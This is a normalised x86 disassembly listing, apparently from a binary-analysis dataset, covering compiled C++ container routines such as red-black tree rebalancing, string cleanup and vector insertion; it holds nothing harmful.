cmp ebp ecx
mov esi [ esi + 0x4 ]
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x28 ] bl
je r-xdata
mov cl [ esi + 0x28 ]
mov [ eax + 0x28 ] cl
mov [ esi + 0x28 ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x28 ] bl
call sub_447f10
mov edx [ eax + 0x8 ]
mov [ edx + 0x28 ] bl
push eax
mov ecx edi
mov [ eax + 0x28 ] 0x0
call sub_447eb0
mov eax [ esi ]
mov [ eax + 0x28 ] 0x0
mov cl [ esi + 0x28 ]
mov [ eax + 0x28 ] cl
mov [ esi + 0x28 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x28 ] bl
call sub_447eb0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x28 ] bl
push eax
mov ecx edi
mov [ eax + 0x28 ] 0x0
call sub_447f10
mov eax [ esi + 0x8 ]
sub_4485d0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x29 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_4485d0
mov esi [ esi ]
mov ecx edi
call sub_4480b0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x29 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_448610
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
add esi 0x20
cmp esi ebx
jne r-xdata
pop edi
sub_448640
push ebp
mov ebp esp
push 0xffffffff
push sub_4c04b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x20
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
cmp edi [ ebp + 0xc ]
je r-xdata
sub_4486ac
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp esi edi
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x20
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_448700
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x7ffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
shl eax 0x5
push edi
mov edi eax
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_4481a0
sub_448760
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c04c8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x9249248
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_448220
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x28 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x28 ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x28 ] bl
mov [ edx + 0x28 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x28 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x28 ] bl
mov [ edx + 0x28 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x28 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x28 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x28 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_447eb0
mov esi ecx
push esi
mov ecx edi
call sub_447f10
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x28 ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x28 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x28 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_447f10
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_447eb0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_448940
push ebp
mov ebp esp
push 0xffffffff
push sub_4c04e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_4481a0
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_448be0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0501
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
dec ecx
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x8 ] esi
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
cmp [ ebp + 0xc ] ebx
jbe r-xdata
sub_448c50
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp esi edi
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x20
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
sub_448ca0
sub esp 0x10
push ebx
push ebp
mov ebp ecx
mov eax [ ebp + 0x4 ]
mov edx [ eax + 0x4 ]
mov cl [ edx + 0x29 ]
test cl cl
push esi
mov ebx eax
mov al 0x1
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x14 ] al
jne r-xdata
test al al
mov esi ebx
mov [ esp + 0x28 ] esi
je r-xdata
mov esi [ edi + 0x14 ]
mov [ esp + 0x10 ] esi
cmp [ edi + 0x18 ] 0x10
mov edx [ edi + 0x14 ]
lea ecx [ esi + 0xc ]
jb r-xdata
mov eax [ ebp + 0x4 ]
cmp ebx [ eax ]
jne r-xdata
lea eax [ edx + 0x10 ]
mov eax [ edx + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x28 ]
call sub_447f70
mov esi [ esp + 0x28 ]
push edi
push ebx
push 0x1
lea eax [ esp + 0x34 ]
push eax
mov ecx ebp
call sub_448760
mov ecx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
test ebp ebp
je r-xdata
mov ebp esi
cmp esi ebp
jae r-xdata
mov eax [ esp + 0x24 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x14 ]
push edi
push ebx
push eax
lea ecx [ esp + 0x34 ]
push ecx
mov ecx ebp
call sub_448760
mov edx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
push edx
mov edx [ ecx + 0x14 ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
jge r-xdata
cmp ebp ebx
jae r-xdata
cmp ebp ebx
mov ecx ebp
jb r-xdata
xor eax eax
cmp ebp ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov edx [ edx + 0x8 ]
mov edx [ edx ]
jmp r-xdata
test eax eax
lea esi [ edi + 0x4 ]
mov esi [ edi + 0x4 ]
jmp r-xdata
cmp [ edx + 0x24 ] 0x10
mov ebx [ edx + 0x20 ]
mov [ esp + 0x18 ] edx
jb r-xdata
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov cl [ edx + 0x29 ]
test cl cl
je r-xdata
test eax eax
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x28 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi eax
xor eax eax
[ esi ] [ edi ]
je r-xdata
setl al
test al al
mov [ esp + 0x14 ] al
je r-xdata
sub_448e00
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_4480e0
add esi 0x20
cmp esi edi
jne r-xdata
sub_448e30
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_4480e0
add esi 0x20
cmp esi edi
jne r-xdata
sub_448e80
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_448940
pop edi
pop esi
retn 0x8
sub_448f00
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x10 ]
cmp ecx edx
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
retn 0xc
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_448110
mov ebx [ ebp + 0x8 ]
mov esi eax
add esp 0x10
cmp esi ebx
mov edi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ ebp + 0x8 ] esi
mov ecx edi
call sub_4480e0
add edi 0x20
cmp edi ebx
jne r-xdata
sub_448f60
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x29 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_4485d0
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_4482d0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
jmp r-xdata
sub_449040
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_448640
add esp 0x14
retn 0xc
sub_449080
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c051e
push eax
mov eax ecx
mov [ fs : 0x0 ] esp
xor ecx ecx
mov edx 0xf
mov [ eax + 0x1c ] edx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x8 ] cl
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x50 ] edx
mov [ eax + 0x3c ] cl
mov [ eax + 0x1a4 ] ecx
mov [ eax + 0x1a8 ] edx
mov [ eax + 0x194 ] cl
mov [ eax + 0x1c0 ] ecx
mov [ eax + 0x1c4 ] edx
mov [ eax + 0x1b0 ] cl
mov [ eax + 0x1dc ] ecx
mov [ eax + 0x1e0 ] edx
mov [ eax + 0x1cc ] cl
mov [ eax + 0x1f8 ] ecx
mov [ eax + 0x1fc ] edx
mov [ eax + 0x1e8 ] cl
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
sub_449110
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x1fc ]
mov ebp 0x10
cmp eax ebp
push edi
jb r-xdata
xor ebx ebx
mov edi 0xf
mov [ esi + 0x1fc ] edi
mov [ esi + 0x1f8 ] ebx
mov [ esi + 0x1e8 ] bl
cmp [ esi + 0x1e0 ] ebp
jb r-xdata
mov eax [ esi + 0x1e8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1e0 ] edi
mov [ esi + 0x1dc ] ebx
mov [ esi + 0x1cc ] bl
cmp [ esi + 0x1c4 ] ebp
jb r-xdata
mov eax [ esi + 0x1cc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1c4 ] edi
mov [ esi + 0x1c0 ] ebx
mov [ esi + 0x1b0 ] bl
cmp [ esi + 0x1a8 ] ebp
jb r-xdata
mov eax [ esi + 0x1b0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1a8 ] edi
mov [ esi + 0x1a4 ] ebx
mov [ esi + 0x194 ] bl
cmp [ esi + 0x50 ] ebp
jb r-xdata
mov eax [ esi + 0x194 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x50 ] edi
mov [ esi + 0x4c ] ebx
lea ecx [ esi + 0x20 ]
mov [ esi + 0x3c ] bl
call sub_448e30
cmp [ esi + 0x1c ] ebp
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] ebx
pop edi
mov [ esi + 0x8 ] bl
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_449210
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_448be0
mov eax esi
add esp 0x14
shl eax 0x5
add eax edi
pop edi
pop esi
retn 0xc
sub_449240
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0538
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0xffffffff
mov esi ecx
push ebx
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x34 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ ebp - 0x1c ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
cmp [ ebp - 0x20 ] 0x10
jb r-xdata
cmp ecx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4481a0
mov ebx 0x7ffffff
sub ebx edx
cmp ebx edi
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
cmp ecx edi
mov [ ebp - 0x18 ] eax
jae r-xdata
mov edx eax
shr edx 0x1
mov ebx 0x7ffffff
sub ebx edx
cmp ebx eax
jae r-xdata
add edx edi
cmp eax edx
jae r-xdata
push eax
push ecx
mov ecx esp
shl edi 0x5
mov edx edi
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov edi eax
mov ecx esp
sub edi edx
mov [ ecx ] edi
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x10 ] edx
call sub_449040
push ecx
mov ecx [ ebp - 0x18 ]
mov [ esi + 0x8 ] eax
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] ecx
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] edi
mov eax esp
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push edx
mov [ eax ] ebx
call sub_4b2840
add esp 0x10
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
add ecx ebx
mov [ eax ] ecx
mov ecx edi
shl ecx 0x5
mov [ ebp + 0x10 ] ecx
add ecx ebx
push ecx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] ebx
call sub_449040
mov eax [ esi + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
lea edx [ ebp - 0x38 ]
push edx
sub edi ecx
push edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_449210
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x38 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_448610
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x5
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
